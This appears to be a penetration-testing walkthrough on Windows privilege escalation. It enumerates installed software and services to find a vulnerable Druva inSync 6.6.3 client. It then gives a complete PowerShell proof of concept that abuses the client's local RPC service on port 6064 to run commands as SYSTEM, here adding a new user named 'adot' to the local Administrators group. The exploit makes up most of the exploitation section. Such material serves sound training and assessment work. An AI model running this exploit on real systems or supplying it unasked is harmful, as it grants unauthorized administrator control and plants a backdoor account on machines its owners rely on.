We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let's look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.

#### Exploitation
Find installed programs
```powershell
wmic product get name
```

`Druva inSync` application stands out. A quick Google search shows that version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service.

We can use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges

Enumerate local ports
```powershell
netstat -ano | findstr 6064
get-process -Id 3324
```

Enumerate running services
```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

##### Druva inSync Windows Client Local Privilege Escalation Example
Druva inSync PowerShell PoC

With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user adot Pwned123! /add && net localgroup Administrators adot /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

```powershell
.\DruvaPrivMe.ps1
```